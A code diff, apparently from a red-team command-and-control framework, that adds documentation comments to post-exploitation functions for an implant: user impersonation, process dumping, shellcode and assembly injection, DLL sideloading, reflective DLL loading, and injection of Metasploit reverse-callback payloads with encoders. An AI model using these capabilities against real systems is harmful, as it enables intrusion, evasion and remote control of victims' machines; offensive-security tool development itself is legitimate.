@@ -45,6 +45,7 @@ type Post struct {
 	Session *core.Ghost
 }
 
+// NewPost - Instantiates a new Post module, with a base module object, and an empty Session
 func NewPost() *Post {
 	post := &Post{&Module{}, nil}
 	return post
@@ -430,9 +431,9 @@ func (m *Post) ProcDump(pid int, timeout time.Duration) (tmp string, err error) 
 // -----------------------------------------------------------------------------------------------------------//
 
 // RunAs - (WINDOWS ONLY) Run a program located at @path, as user @username.
-// @username - User to impersonate
-// @process - Path to process to run
-// @args - Optional list of arguments to run with the process
+// @username    => User to impersonate
+// @process     => Path to process to run
+// @args        => Optional list of arguments to run with the process
 func (m *Post) RunAs(username, process string, args []string, timeout time.Duration) (result string, err error) {
 	err = m.GetSession()
 	if err != nil {
@@ -462,7 +463,7 @@ func (m *Post) RunAs(username, process string, args []string, timeout time.Durat
 }
 
 // Impersonate - (WINDOWS ONLY) Impersonate a user on the target.
-// @username - User to impersonate
+// @username => User to impersonate
 func (m *Post) Impersonate(username string, timeout time.Duration) (result string, err error) {
 	err = m.GetSession()
 	if err != nil {
@@ -579,6 +580,10 @@ func (m *Post) Execute(path string, args []string, timeout time.Duration) (resul
 }
 
 // ExecuteAssembly - Execute a DLL assembly located at @path into a child process, with optional arguments.
+// @dll     => local path to assembly
+// @process => hosting process to inject into
+// @args    => optional arguments to use when running the process
+// @timeout => Desired timeout for the session command
 func (m *Post) ExecuteAssembly(dll, process string, args []string, timeout time.Duration) (result string, err error) {
 	err = m.GetSession()
 	if err != nil {
@@ -620,14 +625,18 @@ func (m *Post) ExecuteAssembly(dll, process string, args []string, timeout time.
 	return "", nil
 }
 
-// ExecuteShellcode - Load and execute a shellcode in a process.
-func (m *Post) ExecuteShellcode(shellcodePath string, pid int, rwxPages bool, timeout time.Duration) (result string, err error) {
+// ExecuteShellcode - Load and execute a shellcode in the Ghost implant process
+// @shellcode   => local path to raw shellcode
+// @pid         => optional PID
+// @rwxPages    => Allocate a RWX memory block for the shellcode in the target
+// timeout      => Desired timeout for the session command
+func (m *Post) ExecuteShellcode(shellcode string, pid int, rwxPages bool, timeout time.Duration) (result string, err error) {
 	err = m.GetSession()
 	if err != nil {
 		return "", errors.New("Error finding ghost Session when list processes")
 	}
 
-	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
+	shellcodeBin, err := ioutil.ReadFile(shellcode)
 	if err != nil {
 		return "", fmt.Errorf("Error: %s\n", err.Error())
 	}
@@ -655,6 +664,11 @@ func (m *Post) ExecuteShellcode(shellcodePath string, pid int, rwxPages bool, ti
 }
 
 // SideloadDLL - Load a DLL into a process.
+// @dll         => local path to DLL
+// @entryPoint  => function name to call when loading the DLL
+// @process     => remote path to process to run
+// @args        => optional arguments to use when running the process
+// @timeout     => Desired timeout for the session command
 func (m *Post) SideloadDLL(dll, entryPoint, process string, args []string, timeout time.Duration) (result string, err error) {
 	err = m.GetSession()
 	if err != nil {
@@ -694,6 +708,11 @@ func (m *Post) SideloadDLL(dll, entryPoint, process string, args []string, timeo
 }
 
 // SpawnDLL - Load and execute a Reflective DLL into a process.
+// @dll         => local path to DLL
+// @export      => Optional function name export
+// @process     => remote path to process to run
+// @args        => optional arguments to use when running the process
+// @timeout     => Desired timeout for the session command
 func (m *Post) SpawnDLL(dll, export, process string, args []string, timeout time.Duration) (result string, err error) {
 	err = m.GetSession()
 	if err != nil {
@@ -736,10 +755,20 @@ func (m *Post) SpawnDLL(dll, export, process string, args []string, timeout time
 }
 
 // InjectMSFPayload - Generate, load and execute a MSF payload into a process, given its PID.
+// @payload     => MSF payload name ('meterpreter_reverse_http', etc...)
+// @lhost       => LHOST to callback
+// @lport       => LPORT to callback
+// @pid         => Process ID to inject the payload into
+// @encoder     => Name of the MSF encoder to use
+// @iters       => Number of encoding iterations
+// @timeout     => Desired timeout for the session command
 func (m *Post) InjectMSFPayload(payload, lhost string, lport int, pid int, encoder string, iters int, timeout time.Duration) (result string, err error) {
 	err = m.GetSession()
 	if err != nil {
 		return "", errors.New("Error finding ghost Session when list processes")
+	}
+	if iters == 0 {
+		iters = 1
 	}
 
 	config := msf.VenomConfig{
